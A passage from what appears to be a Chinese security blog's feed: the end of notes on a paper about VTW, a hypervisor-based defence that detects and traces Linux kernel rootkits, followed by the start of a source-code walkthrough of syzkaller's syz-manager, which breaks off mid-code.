的地址覆写 $orig_item$。接下来 VTW 将 $last_page_table$ 的所有内容拷贝到 $new_last_page_table$ 中。与此同时其会为每个目标 LKM 创建一份内存页并通过 EPT 将其设为 “不可执行”，该内存页被称之为 $fake_code$，其地址则为 $fake_mem$。</p><p>最后， LKM 的代码段 在 $new_last_page_table$ 中对应的的所有条目都被填充为 $fake_mem$，若我们尝试打开 LKM 的执行，则 $orig_item$ 将被用 $fake_mem$ 重写。由此，控制流将会被重定向到 $fake_code$ 上。 EPT 异常地址（$fake_item$）将说明哪一个 LKM 将要被执行。</p><p>在 LKM 执行中，第一个被执行的 LKM 称之为第一个模块，发出了模块间调用请求的 LKM 被称为活动模块，被调用的 LKM 被称为被调用模块。</p><p>在第一个 LKM 被执行前，VTW 读取调用函数储存在内核栈上的返回地址并在此处设置一个执行断点，接下来 VTW 启用 LKM 的执行权限。当控制流在 LKMs 之间切换时，我们追踪控制流流过的所有 LKMs。追踪方案如下所示。</p><h2 id="6-2-Forward-Versus-Backward-of-Rootkit-Attack"><a href="#6-2-Forward-Versus-Backward-of-Rootkit-Attack" class="headerlink" title="6.2 Forward Versus Backward of Rootkit Attack"></a>6.2 Forward Versus Backward of Rootkit Attack</h2><p>rootkits 攻击在如下所示的 11 个步骤的前向与后向阶段中被实施。该方法用以监控 LKM 控制流的跳转与返回。步骤 1 ~ 6 监控跳转，步骤 7 ~ 11监控返回过程。</p><p><img src="https://s2.loli.net/2023/04/09/XmxawZS56dG38kT.png" alt="image.png"></p><p>由于对 LKM 的权限设置，在该过程中任何在 LKMs（$ConFlowTrans$）间的控制流的跳转都将触发操作系统陷入到 “host” （步骤 1）。VTW 通过所流过的控制流记录每一个 LKM （步骤 2），并检查每个跳转的内核数据的合法性。若数据合法（步骤 3），VTW 将开启被调用模块的执行权限（$TurnOffExe$）并关闭活跃 LKM 的执行权限 （$TurnOnExe$，步骤 4）。否则，VTW 通过函数 $HandleException$ 处理非法的 LKM（步骤 5 ~ 6），并处理包括数据恢复（$RecoverData$）与 #GP 注入（$InjectGP$）的操作。</p><p>当 LKM 的控制流返回时（$ControlFlowRet$），VTW 跟踪返回动作（步骤 7 ~ 11），当返回到设置在第一个 LKM 的返回地址的断点时，意味着当前的执行完成了。</p><p>当活动的 LKM 提交了一个在 LKMs 间的调用请求或是控制流返回到之前的 LKM，VTW 将检测是否当前的内核数据已经被活动的 LKM 篡改了。对于动态内核数据，VTW 使用 “Rootkit 攻击检测” 方法进行检测。</p><p>对于有着写保护的静态内核数据，任何的篡改都将导致操作系统陷入到 “host”，之后 VTW 将操作系统设置到单步调试并启用对内核数据的写权限。由此，在 LKM 完成对静态内核数据的篡改后，其会再次陷入到 “host”。最后 VTW 读取被篡改的数据并使用备份数据中的初始值进行恢复。</p><p>通过上述操作，VTW 可以获得篡改的数据，将篡改的数据与所有 LKMs 的代码段范围进行对比，我们可以得知重定向控制流所属的 LKM。</p><p>若检测到内核数据被篡改了，当前运行的内核模块将被认为是攻击的行为载体，第一个模块将成为动作载体，重定向控制流所属的模块则成为函数载体。</p><p>其他的 LKMs 将成为过程载体。为了预防更多的伤害，VTW 向当前控制流注入一个通用保护异常。最后，被篡改的内核数据将被复原，当前的有害操作将被终止。</p><h2 id="6-3-Task-Switching-in-Multicore-Execution"><a href="#6-3-Task-Switching-in-Multicore-Execution" class="headerlink" title="6.3 Task Switching in Multicore Execution"></a>6.3 Task Switching in Multicore Execution</h2><p>当 LKM 执行时发生了任务切换，LKM 的 CPU 资源将被收回。若 LKM 不再被调度，其将永远不会产生模块间调用请求，我们在返回地址设置的执行断点将永远不会被执行。由于缺乏触发条件，VTW 将在最后一次检测后忽略掉 LKM 在内核上的影响。</p><p>不同的 LKMs 可能被在多个核心上并行执行，这可能影响对行为载体的识别，例如两个 LKMs 可能同时在不同的 CPU 核心中运行。若动态内核对象被检测到在其运行时被篡改，我们无法算出这两个 LKMs 中的哪一个进行了有害操作。</p><p>为了确保精确的可追踪性，VTW 引入一个动作回放方法，在 “攻击回放程序”（Attack Playback Procedure）中展示。当一个 LKM 被调度以执行且在其他核心上有一个或更多 LKMs 正在被执行，则该方法会被启动。</p><h2 id="6-4-Attack-Playback-Procedure"><a href="#6-4-Attack-Playback-Procedure" class="headerlink" title="6.4 Attack Playback Procedure"></a>6.4 Attack Playback Procedure</h2><p>当多个 LKMs 同时跑在多个核心上时，该方法用以辨别哪一个 LKM 为内核 rootkit。攻击回放程序如下所示，步骤 1 ~ 5 为所需内容，步骤 6 ~ 9 进行回放。当 LKM $\mathscr{L}j$ 被载入在一个核心上运行时（$LoadOnCore$），该执行必须触发操作系统陷入到 host 模式（“攻击回放程序” 中的 步骤 1）。在这之后， $\mathscr{L}j$ 将被记录到元组 $\mathscr{F}$ 中（步骤 2）。</p><p>VTW 首先通过函数 $CheckKernel$ 检查当前的内核数据完整性是否被破坏，若未被破坏（步骤 3），其会拷贝当前的 CPU 上下文信息、内核栈、LKM 代码段（所有这些称作回放上下文）。</p><p><img src="https://s2.loli.net/2023/04/09/4qFEaxVPRTUcJCb.png" alt="image.png"></p><p>若有多于一个 LKM 运行在不同的 CPU 核心上，所有运行中的 LKMs 都已被备份，由此我们只需要备份要被执行的 LKM（步骤 4 ）。若仅有一个运行中的 LKM，正在被执行的 LKM 与将要被执行的 LKM 都需要要被备份（步骤 5）。在完成备份后，VTW 将操作系统再次切换回 “guest” 模式以继续运行。</p><p>为了算出哪一个 LKM 为内核 rootkit，所有的动作都会被通过 $ForEach$ 与 $ExeBack$ 函数为所有在其他核心上运行的 LKMs 逐一进行回放。回放步骤如 图.6 所示，回放过程为如下所示的五个步骤：</p><p>1） 使用之前备份的内容重写当前内核栈与 LKM 的数据。</p><p>2） 使用备份的 CPU 上下文填充 VMCS 的 “guest filed” 并恢复被破坏的内核数据。</p><p>3） 将操作系统切换到 “guest” 模式以开始 LKM 执行。</p><p>4） 在内核数据被摧毁的指令位置停止执行。</p><p>5）检测是否一个被破坏的数据将触发二次破坏。当前的 LKM 为行为载体。若该内核数据保持完整，则切换到步骤 （1） 恢复回放。</p><p><img src="https://s2.loli.net/2023/04/09/iagyB7kZt3jJnWT.png" alt="图.6 跟踪一个 Linux 服务器上两个执行核心间的任务切换"></p><p>通过该方法，每个 LKM 都将会从内核数据未被摧毁的位置开始执行，并停止在内核数据被摧毁的位置。若被回放的 LKM 破坏了内核数据的完整性，其将被识别为 rootkit（步骤 9）。</p><p>在追踪完成之后，VTW 将为剩余的 LKMs 恢复执行，并让他们从内核数据完整性被破坏的位置继续执行。</p><p>在动作回放过程中，被恢复的内核数据包括被篡改的内核数据与回放上下文，对前者的恢复将维持内核的完整性，后者则仅与被回放的 LKM 相关。由此，被恢复的内核数据并不会影响其他 LKMs 的执行。</p><p>我们分析了 23 个内核 rootkits 并发现除了回放上下文以外，他们不会修改其他内核数据。在对 72 个在 Linux 中被频繁使用的普通 LKMs （例如 $nf_nat,ib_cm,snd_seg$ 等）的监控过程当中，我们发现普通的 LKMs 将不会修改被保护的内核数据，也不会修改在回放上下文以外的任何东西。</p><p>由此，在进行动作回放时我们并不需要恢复除了被篡改的内核数据与回放上下文以外的内核数据，这并不会影响其他 LKMs 的正确性。</p><h1 id="7-Experiments-And-Performance-Analysis"><a href="#7-Experiments-And-Performance-Analysis" class="headerlink" title="7 Experiments And Performance Analysis"></a>7 Experiments And Performance Analysis</h1><p>我们使用几个内核 rootkit 与基准测试来测试 VTw 的防护效果与运行效率。</p><h2 id="7-1-Experimental-Environment"><a href="#7-1-Experimental-Environment" class="headerlink" title="7.1 Experimental Environment"></a>7.1 Experimental Environment</h2><p>实验中的物理 host 为一个有一颗 Intel i3-9100 @ 3.6 GHZ 4核心处理器、8G内存、256G硬盘的 HP 桌面电脑。不同 rootkit 的安装环境是非常不同的，为了安装 rootkit $f00lkit$，我们使用 Ubuntu 12.04 与内核 3.2.16 作为被测试操作系统。</p><h2 id="7-2-Rootkit-Detection-Defence-and-Traceability"><a href="#7-2-Rootkit-Detection-Defence-and-Traceability" class="headerlink" title="7.2 Rootkit Detection, Defence, and Traceability"></a>7.2 Rootkit Detection, Defence, and Traceability</h2><p>$f00lkit$ 通过修改系统调用表来隐藏目标对象，其将控制流重定向到其自己的代码段上。VTW 在 $f00lkit$ 上的检测效果如 图.7 所示。</p><p><img src="https://s2.loli.net/2023/04/09/4G8tqF7iSLXAjOv.png" alt="图.7 对一个典型被检测的 rootkit 攻击（f00lkit）的过程的虚拟化"></p><p>上、中、下三个窗口分别为在 VTW 载入之前对操作系统的入侵表现、在 VTW 载入后对操作系统的入侵表现、VTW 的防护结果。在上面的窗口中，我们发现 $f00lkit$ 可以隐藏以 $”f00l_“$ 开头的文件，如第二行所示。</p><p>中间的窗口显示了在 VTW 载入后 $f00lkit$ 不再对以 $”f00l_“$ 开头的文件有着隐藏的效果，当 $f00lkit$ 尝试修改系统调用表时，VTW 检测到了其意图并生成一个 “EPT violation”，之后 VTW 将一个 #GP 提交到 “guest” 进行预防。</p><p>为了测试 VTW 的可追踪性，我们重写了 rootkits $f00lkit$ 与 $xingyiquan$ ，并引入了两个辅助的 LKMs $jmp_lkm$ 与 $action_lkm$ ，在我们设置的攻击场景中，$f00lkit$ 并不会摧毁内核数据，其有一个用于替换系统函数以隐藏以 $”f00l_“$ 开头的文件的导出函数 $func_1$。</p><p>在辅助 LKM $action_lkm$ 中还有一个导出函数 $func_2$ 。当 $func_2$ 被执行时，其会篡改内核数据并将系统控制流重定向到  $func_1$ 。在辅助 LKM $jmp_lkm$ 中的导出函数为  $func_3$ ，在  $func_2$ 执行过程中  $func_3$ 会被调用。</p><p>上述三个导出函数直到被其他 LKMs 调用时才会被执行。当 $xingyiquan$ 执行时， $func_3$ 被 $xingyiquan$ 调用，最后内核函数被通过  $func_2$  重定向至 $f00lkit$。</p><p>LKM $action_lkm$ 直接篡改系统调用表，其为一个行为载体。原有的系统调用函数被 $f00lkit$ 中的函数所替，由此，VTW认定 $f00lkit$ 为一个函数载体。该次攻击的第一个发起者为 $xingyiquan$，其通过 $lkm_jmp$ 使得控制流跳转到其他模块，由此 $xingyiquan$ 被确定为动作载体，$jmp_lkm$ 被确定为过程载体。</p><p>VTW 检测、防御、追踪包括 $adore$-$ng、kbeast、wnps、brootus、diamorphine、z$-$rootkit、suterusu$ 等在内的内核 rootkits。VTW 通过 EPT 页表为如系统调用表的内核对象设置写保护，由此，任何写操作都将导致操作系统从 “guest” 模式陷入到 “host” 模式。</p><p>之后 VTW 使用 #GP 异常来防止非法操作。内核 rootkits 的整个执行过程都被 VTW 所监控。通过操控 LKMs 的执行权限，VTW 可以夺取每个 LKM 的执行。由此，LKM 的调用、跳转、返回都被同步记录。</p><h2 id="7-3-Performance-Evaluation"><a href="#7-3-Performance-Evaluation" class="headerlink" title="7.3 Performance Evaluation"></a>7.3 Performance Evaluation</h2><p>在本节中， VTW 在 CPU 上的执行开销将被使用 $nbench$ 测量，对系统延迟与带宽的影响将被 Lmbench 测量，对 I&#x2F;O 的影响将被 IOMeter 测量。所有的结果都在原生操作系统测试中进行了标准化。</p><p>$Nbench\ Test$。测试结果如 图.8 所示。VTW 引入了小于 2% 的 CPU 开销。VTW 本质上是一个轻量级的 hypervisor 且不提供如其他虚拟化平台（例如 Xen）那样复杂的虚拟化功能。由此，其带给 CPU 的性能开始非常小。</p><p><img src="https://s2.loli.net/2023/04/10/B4QEyK5VCW9JviO.png" alt="图.8 VTW 方案的执行开销。x-axis 显示了运行速度损失系数，y-axie 为执行的基准测试程序"></p><p>$Lmbench\ Test$。Lmbench 被用以测量系统延迟与贷款。测试结果如 图.9a、9b、9c 所示。VTW 增加了平均 8.8% 的内存与网络延迟与平均 5.9% 的文件操作延迟。通信带宽减少了 2.2%。</p><p><img src="https://s2.loli.net/2023/04/10/crCIiGy58atvN29.png" alt="图.9 内存/网络访问延迟，文件操作与 IO 带宽的减少被绘制为系统对基准或网络、内存、文件访问操作的百分比"></p><p>在 Lmbench 测试中，我们发现 OS 在 “host” 与 “guest” 间的切换频率显著地增长了，大部分的切换由指令 $cpuid$ 引起。由于缓存操作速度非常快，其对于任何的延迟都是极度敏感的。由此，在缓存上的模式切换的影响是尤其明显的，导致了将近 20% 的延迟开销。</p><p>$IOMeter Test$。IOMeter 是由 Intel 开发的一个用以测试最大磁盘 I&#x2F;O 性能与最大数据吞吐量的一个测试工具测试结果如 图.10a、10b 所示，该图展示了 VTW 造成了平均 8.9% 的 I&#x2F;O 带宽减少，与平均 3.9% 的运行时间增长。</p><p><img src="https://s2.loli.net/2023/04/10/NRl3YwFcbPjtvEC.png" alt="I/O表现开销绘制为 I/O 带宽损失系数与 I/O 时间增长 "></p><p>VTW 在 I&#x2F;O 上的影响主要由 I&#x2F;O 操作的运行时间导致，这减少了 I&#x2F;O 吞吐量且增加了 I&#x2F;O 响应时间。由 VTW 引入的开销包括存储与计算开销。</p><p>存储开销主要指内存开销，包括内存空间开销与寻址时间开销。 VTW 占用不多于 200KB 的内存空间来存储其核心代码与数据，以及 64KB 以存储被保护的内核数据。</p><p>计算开销来自由 VTW 带来的事件注入、内核保护与异常处理，这些操作将造成操作系统从 guest 模式陷入 “host” 模式。</p><p>在 host 模式中，VTW 将接管控制流并进行异常处理。在异常处理完成之后，VTW 将操作系统切换回 “guest” 模式，并将控制流返还给操作系统进行后续执行。</p><p>在整个过程中 “guest” 模式的执行始终是被阻塞的，因此如执行速度、延迟、网络延迟、I&#x2F;O 吞吐这样的表现指示器将会受到影响。此外，模式切换造成对 TLB 与缓存的刷新，这将增加对操作系统的性能影响。</p><p>当 VTW 正在运行，导致操作系统进行模式切换的因素包括指令陷入与事件陷入，前者由对特定指令的执行触发，后者由特定事件触发。在 guest 模式中，对指令 CPUID、GETTSEC、INVD、XSETBV 与除了 VMFUNC 以外的所有 VMX 指令都将导致操作系统无条件地陷入到 “host”。</p><p>触发操作系统模式切换的事件包括模块加载、模块卸载、在模块加载时的状态切换、模块间的跳转与控制流返回、模块调度执行、“host” 私有页表的更新、篡改静态内核数据、单步调试模式、动作回放。</p><p>$Impact on the Execution Speed of LKM$。为了测量 VTW 在 LKM 执行速度上的影响，我们引入了两个测试模块 $LKM_1$ 与 $LKM_2$ ，他们分别属于 CPU 密集型与 I&#x2F;O 密集型的模块，前者用以计算 $\pi$ 的值，后者用以读写文件。</p><p>测试结果如 图.11 所示。横坐标为实线指示了 $\pi$ 小数点后的位数，与文件操作数量相关的为点线。纵坐标指示了速度损失速率。</p><p><img src="https://s2.loli.net/2023/04/10/LwJ8WEfkNdTosPb.png" alt="图.11 LKM 速度损失系数与 Π 的小数位数绘制为实线，I/O 操作的数量绘制为点线"></p><p>与此相反，当模块运行较长一段时间时，由 VTW 造成的性能损失比例更小。对于普通 LKMs 而言，VTW 仅在他们被加载以及状态被更新时干涉他们的执行。由 VTW 造成的 “guest” 的阻塞时间是比较固定的。当 LKM 的执行时间较短时，VTW 会阻塞 “guest” 模式更多比例的时间，由此性能损失系数会变得更大。</p><p>陷阱的数量与在模块间的控制流跳转的数量为影响 LKM 执行速度的关键因素。我们以一个运行时间大约 7.6s 的 $LKM_3$ 作为测试对象，并测量了陷阱数量在其执行速度上的影响。</p><p>我们重写了 $LKM_1$ 与 $LKM_2$ 使得控制流在其间跳转， 他们可以被用以测量跳转次数对 LKM 执行速度的影响。实验结果如 图.12 所示。</p><p><img src="https://s2.loli.net/2023/04/11/p4HBzul5Tcj9iRm.png" alt="图.12 系统陷阱与控制流跳转在 LKM 执行速度上的影响"></p><p>点线显示了当陷阱数量较少时 VTW 在 LKM 的执行速度上的影响是较小的。当陷阱数量超过 1000000 时，LKM 的执行将会减速到 80%。实线显示了当跳转数量超过 100 时，VTW 减速到了 8%。当跳转数量超过 1000 时， LKM 的执行速度将会急剧减小。</p><p>控制流跳转对 LKM 执行的影响比陷阱更大。一个完整的跳转与返回涉及到两个模式切换与四个代码执行权限，因此 VTW 在处理模块间跳转时会遇到更多的开销，</p><h2 id="7-4-Comparison-With-Other-Defence-Schemes"><a href="#7-4-Comparison-With-Other-Defence-Schemes" class="headerlink" title="7.4 Comparison With Other Defence Schemes"></a>7.4 Comparison With Other Defence Schemes</h2><p>在 表.6 中，我们将 VTW 的表现与七个已知 rootkit 防御方案对比。大部分其他的 rootkit 防护方案应用了虚拟机的内省技术，这与 VTW 主要基于事件追踪的方案是非常不同的。</p><p><img src="https://s2.loli.net/2023/04/11/1wYp3xarzkyiXSF.png" alt="表.6 VTW 方案与其他防护方案对比"></p><p>我们从四个表现领域对他们进行定性比较：$检测、防护、可追踪性、可移植性$。VTW 在这四个领域有着如前文所述的显著的优点。在未来的工作中需要更多的基准测试实验以揭示一些定量的结果。</p><p>我们的 VTW 仅被设计以支持 Intel 处理器及仅保护基于 Linux 的 x86 服务器。当前的 VTW 版本并不支持运行 Windows 或其他操作系统平台的服务器。然而，Virtuoso 方案已经报告了其在不同平台上的高可移植性。</p><p>根据解决恶意软件变种的能力，我们将检测、防护、可追踪性能力分为三个级别：好、一般、差。</p><p>对于 rootkit 检测，VTW、Xtier、Virtuoso、RTKDSM 都被评为好。对于防护与可追踪性，所有的方案都被评为一般或差，仅有 DIKernel 展示了一些防护能力。与 VTW 类似，所有报道的方案都运行在 x86 处理器，除了 DIKernel 在 arm-v7。</p><p>我们的实验揭示了一些在 CPU 上的测量结果与存储开销。如与 表.6 中剩余的方案对比所示，VTW 在实施所有的防护与过滤操作的系统开销上展现了显著的优势。特别的，我们想要指出使用 VMST 与 PTKDSM 方案的过度开销。</p><h1 id="8-Concluding-Remarks"><a href="#8-Concluding-Remarks" class="headerlink" title="8 Concluding Remarks"></a>8 Concluding Remarks</h1><p>本论文提出了一种新的虚拟化墙（virtual wall，VTW）方案以在 Linux 服务器上过滤内核 rootkit。总而言之，我们证明了我们的 VTW 防护方案在 rootkit 的检测、防护、可追踪性上有着较好的表现。VTW 比其他任何 rootkit 防护系统的内存与存储开销都要低得多。</p><p>所有在 guest 模式下损坏安全策略的操作都将导致操作系统陷入到 host 模式中，VTW 利用一种内存访问控制机制与一个事件注入机制来完成 rootkit 过滤过程。</p><p>未来追踪 LKMs 的执行路径与所有的内核攻击参与者，我们提出了一种基于 LKM 执行路径的追踪机制。我们的 VTW 实时保护了静态内核数据的完整性。对于动态内核对象，VTW 在追踪过程中检测内核数据的可用性，由此每个被破坏的 LKM 数据都可以被检测与恢复。</p><p>我们的 VTW 使用通用防护异常来防止更多的损害。当内核攻击的参与者涉及多个内核 rootkits 时，我们可以通过检查 LKM 的执行路径获得与攻击相关的执行实体。我们追踪在一次攻击中所有参与的内核 rootkits。VTW 为总的 CPU 时间增加了额外的 2% 。</p><p>消极的一面是，VTW 被限制于仅能保护 Linux 服务器。我们的 VTW 方案仅支持 Intel 处理器与 Linux 系统。VTW 并不能在 AMD、ARM 处理器或是运行 Windows 的服务器上运行。SYRINGE、VMST、DIKernel 防护方案亦是如此。</p><p>VTW 对 BIOS 或用户级的 rootkit 攻击的防护有限。对于可能损害内核完整性的 rootkits，他们可能使用 $&#x2F;dev&#x2F;kmem$ 或 $&#x2F;dev&#x2F;mem$ 或其他方案，这可以从本论文的 VTW 中扩展。由于页数限制，我们将在未来的工作中使用这些扩展。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;任何 rootkit，终将绳之以法！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ROOTKIT" scheme="https://arttnba3.github.io/tags/ROOTKIT/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【FUZZ.0x02】syzkaller - II：syz-manager源码分析</title>
    <link href="https://arttnba3.github.io/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/"/>
    <id>https://arttnba3.github.io/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/</id>
    <published>2023-03-01T17:33:58.000Z</published>
    <updated>2023-03-01T20:40:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>宁就是👴の Manager 🐎</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>syzkaller 是一个非常经典的 kernel fuzzer，虽然笔者之前曾经用过（不过笔者太菜了啥都没挖出来）也曾粗略读过源码，但是没有太过于仔细分析就抛在脑后了（悲）</p><p>为了深入学习 fuzzing theory，笔者决定先从这个典中典的 syzkaller 源码进行分析学习 ：）</p><h2 id="PRE-工作原理"><a href="#PRE-工作原理" class="headerlink" title="PRE.工作原理"></a>PRE.工作原理</h2><p>对于 syzkaller 的架构，官方给出了这样的一张 Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><p>syzkaller 整体上为一个<strong>双机调试结构</strong>：由一台机器负责管控整个 fuzzing 流程（本文称为 <code>Host</code>），在另一台机器上进行 fuzzing（本文称为 <code>Guest</code>），Guest 通常为虚拟机，从而能让 Host 更好地管控整个流程</p><p>syzkaller 分为三大组件：</p><ul><li><p>位于 Host：</p><ul><li><code>syz-manager</code> ：syzkaller 的控制中枢，其会启动多个 VM 实例（如图所示的一个黄色卡片就是一个实例）并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code></li></ul></li><li><p>位于 Guest：</p><ul><li><code>syz-fuzzer</code> ：负责引导整个 fuzz 的过程：<ul><li>生成 input</li><li>启动 <code>syz-executor</code> 进程进行 fuzz</li><li>从被 fuzz 的 kernel 的 <code>/sys/kernel/debug/kcov</code> 获得覆盖（coverage）的相关信息</li><li>通过 RPC 将新的覆盖回送到 <code>syz-manager</code></li></ul></li><li><code>syz-executor</code>：负责<strong>执行单个输入</strong>——从 <code>syz-fuzzer</code> 处接受 input 并执行，最后回送结果</li></ul></li></ul><p><code>syz-manager</code> 为 syzkaller 的控制中枢，其会启动多个 VM 实例并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code>，我们通常启动 fuzzing 时便是以 <code>syz-manager</code> 作为程序启动的入口点，因此笔者也先从此处开始分析</p><h1 id="0x01-基本结构体"><a href="#0x01-基本结构体" class="headerlink" title="0x01. 基本结构体"></a>0x01. 基本结构体</h1><p>相比于直接开始分析源码，笔者认为有必要在此之前先列出一些基本的结构体，你也可以把这一节当成一个表来查 ：）</p><h2 id="VM-管控相关"><a href="#VM-管控相关" class="headerlink" title="VM 管控相关"></a>VM 管控相关</h2><p>Host 需要去感知与管控 Guest VMs，因而在 <code>syz-manager</code> 当中有着一套相应的表示与管理 Guest VM 的结构体</p><h3 id="1-Instance：VM-实例"><a href="#1-Instance：VM-实例" class="headerlink" title="1. Instance：VM 实例"></a>1. Instance：VM 实例</h3><p><code>syz-manager</code> 中的 VM 实际上是使用一个名为 <code>Instance</code> 的结构体来表示的，定义于 <code>vm/vm.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">struct</span> &#123;<br>impl     vmimpl.Instance<br>workdir  <span class="hljs-type">string</span><br>timeouts targets.Timeouts<br>index    <span class="hljs-type">int</span><br>onClose  <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>类似地，其需要实现 <code>Interface</code> 接口，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Instance 表示一个单独的 VM.</span><br><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Copy 复制一个 hostSrc 文件到 VM 中并返回 VM 中的文件名.</span><br>Copy(hostSrc <span class="hljs-type">string</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Forward 设置从虚拟机内到主机上给定 tcp 端口的转发，</span><br><span class="hljs-comment">// 并返回要在虚拟机中使用的地址.</span><br>Forward(port <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Run 在虚拟机内执行命令 (类似 ssh cmd).</span><br><span class="hljs-comment">// outc 接受混合了命令行与内核控制台的输出.</span><br><span class="hljs-comment">// errc 接受命令等待返回 error 或 vmimpl.ErrTimeout.</span><br><span class="hljs-comment">// Command 在 timeout 后停止. 在 stop chan 上发送可以用以更早将其终止.</span><br>Run(timeout time.Duration, stop &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, command <span class="hljs-type">string</span>) (outc &lt;-<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, errc &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Diagnose 从 VM 上检索额外的调试信息</span><br><span class="hljs-comment">// (例如通过发送一些 sys-rq&#x27;s 或 SIGABORT&#x27;ing 一个 Go 程序).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 选择性地直接返回 (一些或所有) 信息. 若 wait == true,</span><br><span class="hljs-comment">// 调用者必须等待 VM 直接输出信息到其日志.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// rep 描述了 Diagnose 被调用的原因.</span><br>Diagnose(rep *report.Report) (diagnosis []<span class="hljs-type">byte</span>, wait <span class="hljs-type">bool</span>)<br><br><span class="hljs-comment">// Close 停止并销毁 VM.</span><br>Close()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Copy()</code>：将一个来自宿主机的文件拷贝至虚拟机中，返回虚拟机中的文件名.</li><li><code>Forward()</code>：设置从虚拟机内到主机上给定 tcp 端口的转发，并返回要在虚拟机中使用的地址</li><li><code>Run()</code>：在虚拟机内执行命令</li><li><code>Diagnose()</code>：在虚拟机上检索额外的调试信息</li><li><code>Close()</code>：停止并销毁虚拟机</li></ul><p>需要注意的是<strong>不同类型的 Guest VM 所实现的 Interface 接口是不同的</strong></p><blockquote><p>以 QEMU 为例，其实现主要位于 <code>vm/qemu/qemu.go</code> 中</p></blockquote><h3 id="2-Pool：VM-池"><a href="#2-Pool：VM-池" class="headerlink" title="2.Pool：VM 池"></a>2.Pool：VM 池</h3><p>类似于线程池的概念，在 <code>syz-manager</code> 中使用一个 <strong>VM 池</strong> —— <code>Pool</code> 结构体来管控 Guest VM，该结构体定义于 <code>vm/vm.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">struct</span> &#123;<br>impl        vmimpl.Pool<br>workdir     <span class="hljs-type">string</span><br>template    <span class="hljs-type">string</span><br>timeouts    targets.Timeouts<br>activeCount <span class="hljs-type">int32</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该结构体实现了 <code>Pool</code> 接口，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Pool 表示了一组特定类型的测试机器 (虚拟机, 物理设备, etc).</span><br><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Count 返回池中所有 VM 的数量.</span><br>Count() <span class="hljs-type">int</span><br><br><span class="hljs-comment">// Create 创建并启动一个新的 VM 实例.</span><br>Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (Instance, <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Count()</code>：返回池中所有 VM 的数量</li><li><code>Create()</code>：<strong>新建并启动一个 VM实例</strong>，返回新建的实例对象</li></ul><h4 id="QEMU-VM-浅析"><a href="#QEMU-VM-浅析" class="headerlink" title="QEMU VM 浅析"></a>QEMU VM 浅析</h4><p>以 QEMU 为例的 Pool 接口实现如下，对于 <code>Count()</code> 而言会直接返回配置文件中的计数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code 